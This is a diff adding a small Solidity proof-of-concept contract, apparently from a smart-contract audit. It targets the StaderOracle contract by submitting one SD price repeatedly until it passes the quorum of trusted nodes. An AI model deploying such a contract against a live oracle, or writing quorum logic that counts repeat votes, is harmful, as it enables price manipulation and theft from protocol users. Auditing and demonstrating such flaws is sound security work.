@@ -1,0 +1,14 @@
+contract StaderOracleAttacker {
+    StaderOracle public oracle;
+
+    constructor(address _oracleAddress) {
+        oracle = StaderOracle(_oracleAddress);
+    }
+
+    function attackSubmitSDPrice(uint256 _sdPrice, uint256 _reportingBlockNumber) public {
+        // Repeat the submission of the same SD price multiple times
+        for (uint8 i = 0; i < oracle.trustedNodesCount() / 2 + 1; i++) {
+            oracle.submitSDPrice(StaderOracle.SDPriceData(_sdPrice, _reportingBlockNumber));
+        }
+    }
+}
